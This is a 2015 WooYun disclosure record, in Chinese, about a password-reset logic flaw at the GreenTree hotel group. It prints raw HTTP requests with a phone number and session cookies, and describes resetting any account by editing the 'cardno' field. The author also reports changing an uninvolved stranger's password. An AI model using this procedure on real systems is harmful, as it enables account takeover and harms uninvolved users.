{"id": 5224, "wybug_id": "wooyun-2015-0133408", "wybug_title": "酒店安全之格林豪泰酒店管理集团可任意重置用户密码", "wybug_corp": "格林豪泰酒店管理集团", "wybug_author": "harbour_bin", "wybug_date": "2015-08-11 18:05", "wybug_open_date": "2015-08-16 18:06", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 酒店安全之格林豪泰酒店管理集团可任意重置用户密码PS：先使用自己的两个测试帐号,证明有效. 然后任意找了一个用户帐号进行测试 详细说明：  1、找回密码界面URL：http://www.998.com/Account/FindPassword2、输入我的帐号18551813248,进行测试,相关数据包如下\n\n\nPOST http://www.998.com/Account/GetValidateCodeValue HTTP/1.1Host: www.998.comProxy-Connection: keep-aliveContent-Length: 9Accept: */*Origin: http://www.998.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://www.998.com/Account/FindPasswordAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: ASP.NET_SessionId=ao3iyayop0deogd3k1r4kwmp; Hm_lvt_0e4a2c65bdaddd66a53422d93daebe68=1439264472,1439265356,1439269334,1439269568; Hm_lpvt_0e4a2c65bdaddd66a53422d93daebe68=1439270424code=5049\n\nPOST http://www.998.com/Account/ResetPassword HTTP/1.1Host: www.998.comProxy-Connection: keep-aliveContent-Length: 81Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.998.comUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://www.998.com/Account/FindPasswordAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: ASP.NET_SessionId=ao3iyayop0deogd3k1r4kwmp; Hm_lvt_0e4a2c65bdaddd66a53422d93daebe68=1439264472,1439265356,1439269334,1439269568; Hm_lpvt_0e4a2c65bdaddd66a53422d93daebe68=1439270424phoneOrEmailNo=18551813248&RegisterName=%E7%A5%81%E5%BD%AC%E6%96%8C&valiCode=5049\n3、截包,修改cardno,实现密码修改\n\n\n\n\n\n4、修改成功\n\n\n\n\n\n\n\n以上两个都是我的测试帐号(帐号是不一样的,希望注意), 为验证效果, 随便找了一个用户帐号测试.    漏洞证明：  1、截包,修改cardno,任意找一个帐号,实现密码修改.如下\n\n\n\n修改cardno为100002083055的密码\n\n2、修改成功后登录\n\n\n\n\n\n登录成功, 用户密码被修改为wooyun1.   修复方案：  你们更专业！PS：用户cardno=100002083055的帐号被修改了,望注意   版权声明：转载请注明来源 harbour_bin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-08-16 18:06 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-11 18:07 |    \t\tharbour_bin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:47        | 向TOP200进军！)\t\t \n  乌云审核神速啊    \n     2015-08-17 13:36 |    \t\tharbour_bin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:47        | 向TOP200进军！)\t\t \n  大家帮帮忙, 不要一直用我手机号测试了,自己坑自己    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}